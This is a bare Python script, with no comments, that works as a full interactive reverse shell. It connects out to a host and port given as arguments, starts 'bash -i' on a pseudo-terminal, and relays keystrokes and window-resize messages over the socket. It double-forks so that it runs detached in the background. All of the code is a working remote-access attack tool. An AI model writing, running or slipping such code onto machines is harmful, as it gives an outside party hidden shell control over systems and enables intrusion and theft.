import fcntl, os, select, socket, struct, sys, termios, pty


class Protocol:
    def __init__(self):
        self._rawbuf = b""
        self._msg = []
        self._len = 0

    def return_backlog(self, data):
        self._msg.insert(0, (0x0, data))
        self._len += len(data)

    def _parse_stream(self):
        if len(self._rawbuf) < 5:
            return None
        (op,) = struct.unpack("!B", self._rawbuf[:1])
        if op == 0x0:
            (length,) = struct.unpack("!I", self._rawbuf[1:5])
            if len(self._rawbuf) < 5 + length:
                return None
            data = self._rawbuf[5 : 5 + length]
            self._rawbuf = self._rawbuf[5 + length :]
            self._msg.append((op, data))
            self._len += length
            return
        if op == 0x1:
            if len(self._rawbuf) < 5:
                return None
            w, h = struct.unpack("!HH", self._rawbuf[1:5])
            self._rawbuf = self._rawbuf[5:]
            self._msg.append((op, (w, h)))
            return
        raise Exception(f"unknown op {op} {0x0} {0x1}")

    def __len__(self):
        self._parse_stream()
        return self._len

    def peek(self):
        self._parse_stream()
        if len(self._msg) > 0:
            return self._msg[0][0]
        return None

    def recv(self):
        self._parse_stream()
        if len(self._msg) > 0:
            if self._msg[0][0] == 0x0:
                self._len -= len(self._msg[0][1])
            return self._msg.pop(0)
        return None


def copy(master_fd, peer_fd):
    high_waterlevel = 4096
    master_buf = Protocol()
    peer_buf = b""
    while 1:
        rfds = []
        wfds = []
        if len(master_buf) < high_waterlevel:
            rfds.append(peer_fd)
        if len(master_buf) > 0:
            wfds.append(master_fd)
        if len(peer_buf) < high_waterlevel:
            rfds.append(master_fd)
        if peer_buf:
            wfds.append(peer_fd)
        rfds, wfds, xfds = select.select(rfds, wfds, [peer_fd, master_fd])
        if xfds:
            return
        if peer_fd in wfds:
            n = os.write(peer_fd, peer_buf)
            peer_buf = peer_buf[n:]
        if master_fd in rfds:
            try:
                data = os.read(master_fd, 1024)
            except OSError:
                return
            if not data:
                return
            peer_buf += data
        if master_fd in wfds:
            while msg := master_buf.recv():
                op, pay = msg
                if op == 0x0:
                    n = os.write(master_fd, pay)
                    if n < len(pay):
                        master_buf.return_backlog(pay[n:])
                        break
                elif op == 0x1:
                    fcntl.ioctl(
                        master_fd,
                        termios.TIOCSWINSZ,
                        struct.pack("HHHH", pay[1], pay[0], 0, 0),
                    )
        if master_buf.peek() == 0x1:
            op, pay = master_buf.recv()  # type: ignore
            w, h = pay
            fcntl.ioctl(
                master_fd,
                termios.TIOCSWINSZ,
                struct.pack("HHHH", h, w, 0, 0),
            )
        if peer_fd in rfds:
            try:
                data = os.read(peer_fd, 1024)
            except OSError:
                return
            if not data:
                return
            master_buf._rawbuf += data


def main(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    flags = fcntl.fcntl(sock.fileno(), fcntl.F_GETFD)
    fcntl.fcntl(sock.fileno(), fcntl.F_SETFD, flags | fcntl.FD_CLOEXEC)
    sock.connect((host, port))
    pid, master_fd = pty.fork()
    if not pid:
        os.execve("/bin/bash", ["bash", "-i"], os.environ)
    os.set_blocking(master_fd, False)
    copy(master_fd, sock.fileno())
    os.close(master_fd)
    os.waitpid(pid, 0)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: %s <host> <port>" % sys.argv[0])
        sys.exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    if not os.fork() and not os.fork():
        main(host, port)
